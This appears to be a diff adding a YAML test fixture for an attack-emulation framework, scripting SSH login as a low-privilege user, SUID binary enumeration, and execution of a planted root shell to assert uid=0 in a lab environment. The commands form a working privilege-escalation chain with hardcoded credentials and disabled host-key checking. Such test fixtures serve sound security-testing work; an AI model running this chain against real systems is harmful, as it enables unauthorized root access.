@@ -1,0 +1,28 @@
+# Fixture: suid_privesc
+# Tests: SSH-based enumeration + SUID exploitation, stdout_regex, output chaining
+# Environment: ubuntu_env (SSH running, lowpriv user, /tmp/rootbash SUID binary)
+# Attack chain: find SUID binary → exploit it → assert uid=0(root)
+procedure:
+  - step_id: find_suid
+    action:
+      type: exec_attacker
+      command: >-
+        sshpass -p 'password123'
+        ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5
+        lowpriv@${target_host}
+        'find /tmp /usr/local/bin -perm -4000 -type f 2>/dev/null'
+    expect:
+      stdout_contains: "rootbash"
+    outputs:
+      suid_path: 'regex("(/[^\s]+rootbash)")'
+
+  - step_id: exploit_suid
+    action:
+      type: exec_attacker
+      command: >-
+        sshpass -p 'password123'
+        ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5
+        lowpriv@${target_host}
+        '${steps.find_suid.suid_path} -p -c id'
+    expect:
+      stdout_contains: "uid=0"
